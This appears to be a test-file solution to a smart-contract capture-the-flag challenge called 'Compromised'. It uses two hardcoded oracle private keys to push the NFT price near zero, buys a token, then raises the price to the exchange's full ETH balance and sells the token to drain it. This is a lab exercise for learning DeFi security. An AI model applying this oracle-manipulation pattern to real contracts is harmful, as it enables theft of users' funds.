...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    let oracle1 = new Wallet(
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );

    let oracle2 = new Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );

    let connected_oracle1 = await oracle.connect(oracle1);
    let connected_oracle2 = await oracle.connect(oracle2);

    let symbol = await nftToken.symbol();

    let priceFall1 = await connected_oracle1.postPrice(
      symbol,
      ethers.utils.parseEther("0.00000000000000001")
    );
    let priceFall2 = await connected_oracle2.postPrice(
      symbol,
      ethers.utils.parseEther("0.00000000000000001")
    );
    let connected_player = await exchange.connect(player);
    const buytx = await connected_player.buyOne({
      value: ethers.utils.parseEther("0.00000000000000001")
    });

    let receipt = await buytx.wait();
    let id = parseInt(receipt.logs[0].topics[1]);
    ...
    console.log(
      "Exchange balance before exploit:",
      exchangeETHBalance.toString()
    );
    let priceUp1 = await connected_oracle1.postPrice(
      symbol,
      exchangeETHBalance
    );

    let priceUp2 = await connected_oracle2.postPrice(
      symbol,
      exchangeETHBalance
    );

    let connected_nfttoken = await nftToken.connect(player);
    let approve = await connected_nfttoken.approve(exchange.address, id);
    let sellTx = await connected_player.sellOne(id);

    const exchangeETHBalanceAfterExploit = await ethers.provider.getBalance(
      exchange.address
    );

    console.log(
      "Exchange balance after exploit:",
      exchangeETHBalanceAfterExploit.toString()
    );

    await connected_oracle1.postPrice(symbol, INITIAL_NFT_PRICE);
    await connected_oracle2.postPrice(symbol, INITIAL_NFT_PRICE);
  });
